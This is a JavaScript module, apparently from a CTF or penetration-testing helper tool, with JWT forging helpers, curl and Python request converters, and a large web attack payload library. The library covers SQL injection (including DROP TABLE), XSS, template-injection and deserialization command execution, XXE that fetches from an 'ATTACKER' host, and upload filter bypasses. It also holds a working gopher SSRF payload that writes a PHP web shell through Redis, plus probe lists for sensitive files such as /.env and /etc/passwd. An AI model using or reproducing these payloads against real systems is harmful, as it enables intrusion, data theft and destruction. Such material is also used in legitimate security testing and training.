/* ============================================================
   webkit.js — Web 速查 / JWT / HTTP（离线安全版 payload 库）
   ============================================================ */
const WebKit = (function () {
  'use strict';

  function parseHeaders(text) {
    const h = {};
    for (const line of String(text || '').split(/\r?\n/)) {
      const t = line.trim();
      if (!t || t.startsWith('#')) continue;
      const i = t.indexOf(':');
      if (i < 1) continue;
      h[t.slice(0, i).trim()] = t.slice(i + 1).trim();
    }
    return h;
  }

  async function httpRequest(o) {
    if (window.api && window.api.http) return window.api.http(o);
    const r = await fetch(o.url, { method: o.method || 'GET', headers: o.headers || {}, body: o.body || undefined });
    const body = await r.text();
    return { ok: true, status: r.status, statusText: r.statusText, headers: Object.fromEntries(r.headers.entries()), body, ms: 0 };
  }

  function b64url(bytes) {
    let s = Codec.bytesToB64(bytes);
    return s.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }
  function unb64url(s) {
    s = String(s).replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    return Codec.b64ToBytes(s);
  }
  function decodeJson(s) { return JSON.parse(new TextDecoder().decode(unb64url(s))); }

  const JWT = {
    parse(token) {
      const parts = String(token || '').trim().split('.');
      if (parts.length < 2) return { ok: false, error: '不是 JWT' };
      try {
        const header = decodeJson(parts[0]);
        const payload = decodeJson(parts[1]);
        return { ok: true, header, payload, signature: parts[2] || '', headerRaw: JSON.stringify(header, null, 2), payloadRaw: JSON.stringify(payload, null, 2) };
      } catch (e) { return { ok: false, error: e.message }; }
    },
    build(header, payload) {
      return b64url(Codec.toBytes(JSON.stringify(header))) + '.' + b64url(Codec.toBytes(JSON.stringify(payload)));
    },
    async signHS(body, secret, alg) {
      const name = alg === 'HS384' ? 'SHA-384' : alg === 'HS512' ? 'SHA-512' : 'SHA-256';
      const key = await crypto.subtle.importKey('raw', Codec.toBytes(secret), { name: 'HMAC', hash: name }, false, ['sign']);
      const sig = await crypto.subtle.sign('HMAC', key, Codec.toBytes(body));
      return b64url(new Uint8Array(sig));
    },
    async signSM3HMAC(body, secret) {
      const h = Digest.sm3hmac(Codec.toBytes(secret), Codec.toBytes(body));
      return b64url(Codec.hexToBytes(h));
    }
  };

  function toCurl(o) {
    const lines = [`curl -i -sS -X ${o.method || 'GET'} '${(o.url || '').replace(/'/g, "'\\''")}'`];
    for (const [k, v] of Object.entries(o.headers || {})) lines.push(`  -H '${k}: ${String(v).replace(/'/g, "'\\''")}'`);
    if (o.body) lines.push(`  --data-raw '${String(o.body).replace(/'/g, "'\\''")}'`);
    return lines.join(' \\\n');
  }
  function toPythonReq(o) {
    return `import requests\n\nurl = ${JSON.stringify(o.url || '')}\nheaders = ${JSON.stringify(o.headers || {}, null, 4)}\ndata = ${JSON.stringify(o.body || '')}\n\nr = requests.${(o.method || 'GET').toLowerCase()}(url, headers=headers, data=data, timeout=15, allow_redirects=False)\nprint(r.status_code, len(r.text))\nprint(r.text[:2000])`;
  }

  const Payloads = {
    sqli: {
      union: [
        "' UNION SELECT 1,2,3-- -", "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
        "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -",
        "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -", "1' UNION SELECT NULL,NULL,NULL-- -",
        "admin' UNION SELECT 1,2,3#", "' UNION SELECT 1,@@version,3-- -"
      ],
      error: ["' AND extractvalue(1,concat(0x7e,database()))-- -", "' AND updatexml(1,concat(0x7e,user()),1)-- -", "' AND (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -"],
      boolean: ["' AND 1=1-- -", "' AND 1=2-- -", "' AND substr(database(),1,1)='s'-- -", "admin' AND '1'='1", "admin' AND '1'='2"],
      time: ["' AND SLEEP(5)-- -", "' AND IF(1=1,SLEEP(5),0)-- -", "';SELECT pg_sleep(5)-- -", "' WAITFOR DELAY '0:0:5'-- -"],
      stacked: ["'; DROP TABLE users-- -", "'; SELECT SLEEP(5)-- -", "1;SELECT 1,2,3-- -"],
      waf: ["/*!50000UNION*/ /*!50000SELECT*/ 1,2,3", "UN/**/ION SEL/**/ECT 1,2,3", "%55NION %53ELECT 1,2,3", "' /*!50000AND*/ 1=1-- -"]
    },
    xss: {
      basic: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>"],
      bypass: ["<img src=x onerror=alert`1`>", "<svg><script>alert(1)</script>", "<iframe srcdoc=<script>alert(1)</script>>", "<details open ontoggle=alert(1)>", "'-alert(1)-'", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"]
    },
    ssti: {
      jinja2: ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}"],
      twig: ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "{{['id']|filter('system')}}"],
      freemarker: ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"],
      velocity: ["#set($x=7*7)$x", "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"],
      smarty: ["{7*7}", "{php}echo `id`;{/php}", "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php phpinfo(); ?>\",self::clearConfig())}"]
    },
    ssrf: {
      basic: ["http://127.0.0.1:80/", "http://localhost:8080/admin", "http://[::1]/", "file:///etc/passwd", "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:6379/_INFO"],
      gopher_redis: ["gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"]
    },
    upload: {
      php: ["<?php echo 'CTF';?>", "<?php phpinfo();?>", "GIF89a<?php echo 'CTF';?>"],
      jsp: ["<% out.println(\"CTF\"); %>"],
      asp: ["<% Response.Write(\"CTF\") %>"],
      bypass: ["shell.php.jpg", "shell.php%00.jpg", "shell.php. .jpg", "shell.pHp", "shell.php5", "shell.phtml", "shell.log", "shell.htaccess", ".user.ini", "shell.jpg;.php"]
    },
    cmd: {
      linux: [";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)", "%0aid", "cat /etc/passwd", "ls -la /"],
      windows: ["& whoami", "| whoami", "|| whoami", "&& whoami", "%0a whoami", "type C:\\Windows\\win.ini"],
      bypass: ["c'a't /etc/passwd", "c\"a\"t /etc/passwd", "ca$@t /etc/passwd", "/bin/cat /etc/passwd", "cat${IFS}/etc/passwd", "cat</etc/passwd"]
    },
    xxe: {
      basic: ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>"],
      oob: ["<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://ATTACKER/evil.dtd\">%remote;]>", "<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">"]
    },
    deser: {
      php: ["O:8:\"stdClass\":0:{}", "O:4:\"Test\":1:{s:3:\"cmd\";s:2:\"id\";}", "a:1:{s:3:\"cmd\";s:2:\"id\";}"],
      java: ["rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...", "ysoserial URLDNS / CommonsCollections"],
      python: ["cos\\nsystem\\n(S'id'\\ntR.", "c__builtin__\\neval\\n(S'__import__(\"os\").system(\"id\")'\\ntR."],
      node: ["{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id')}()\"}"]
    },
    headers: {
      'IP 伪造': ['X-Forwarded-For: 127.0.0.1', 'X-Real-IP: 127.0.0.1', 'Client-IP: 127.0.0.1', 'X-Originating-IP: 127.0.0.1', 'X-Remote-IP: 127.0.0.1', 'X-Client-IP: 127.0.0.1', 'Forwarded: for=127.0.0.1', 'X-Forwarded-Host: 127.0.0.1'],
      'Host / 代理': ['Host: 127.0.0.1', 'X-Forwarded-Host: 127.0.0.1', 'X-Host: 127.0.0.1', 'X-Original-URL: /admin', 'X-Rewrite-URL: /admin'],
      'UA / Referer': ['Referer: http://127.0.0.1/admin', 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)', 'X-Requested-With: XMLHttpRequest', 'Content-Type: application/json']
    },
    path: [
      '/admin', '/admin/login', '/login', '/manager', '/console', '/system', '/backup', '/backup.zip', '/www.zip', '/web.zip',
      '/.git/config', '/.svn/entries', '/.DS_Store', '/robots.txt', '/sitemap.xml', '/crossdomain.xml', '/phpinfo.php', '/info.php',
      '/api', '/api/v1', '/swagger-ui.html', '/v2/api-docs', '/actuator', '/actuator/env', '/actuator/heapdump', '/debug', '/test',
      '/upload', '/uploads', '/static/', '/flag', '/flag.txt', '/flag.php', '/shell.php', '/config.php', '/config.php.bak',
      '/WEB-INF/web.xml', '/META-INF/MANIFEST.MF', '/server-status', '/.env', '/.env.bak', '/docker-compose.yml'
    ]
  };

  return { parseHeaders, httpRequest, toCurl, toPythonReq, JWT, Payloads };
})();
